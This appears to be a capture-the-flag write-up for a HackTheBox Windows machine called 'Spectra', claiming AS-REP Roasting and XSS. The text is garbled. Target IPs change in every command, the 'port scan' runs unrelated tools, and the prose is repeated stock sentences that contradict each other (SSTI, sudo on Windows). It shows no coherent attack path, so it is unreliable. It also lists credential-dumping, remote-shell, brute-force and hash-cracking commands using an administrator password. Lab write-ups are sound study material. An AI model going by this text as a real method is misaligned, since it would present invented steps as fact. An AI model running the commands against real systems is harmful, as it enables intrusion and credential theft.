---
TitleSEO: "HackTheBox — Spectra (Easy Windows) | ZureFX"
TitlePost: "HackTheBox — Spectra (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Spectra. AS-REP Roasting and XSS to achieve easy compromise on Windows."
Keywords: "hackthebox, web, active directory"
URL: "https://zurefx.github.io/writeups/htb-spectra-513.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-spectra-513/"
Date: "2024-08-23"
Tags: "HackTheBox, Web, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-spectra-513"
Permalink: "/writeups/htb-spectra-513.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Spectra** is rated **Easy** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.39.51.62`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.83.160.138/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.24.86.149 -u administrator -p 'P@ssw0rd!' --shares
```

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

```bash
gobuster dir -u http://10.68.156.13/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Web Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.42.103.69/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

Key finding: **AS-REP Roasting**.

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.129.53.41
impacket-secretsdump administrator:'P@ssw0rd!'@10.55.39.77
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.145.67
evil-winrm -i 10.76.185.61 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.2.86
crackmapexec smb 10.22.73.3 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.96.113
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.102.47 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `netcat`
- `dcomexec`
- `john`
- `smbexec`
- `metasploit`
- `rpcclient`
- `bloodhound`
- `nmap`

### Key Takeaways

- AS-REP Roasting
- XSS
- XXE
- Command Injection
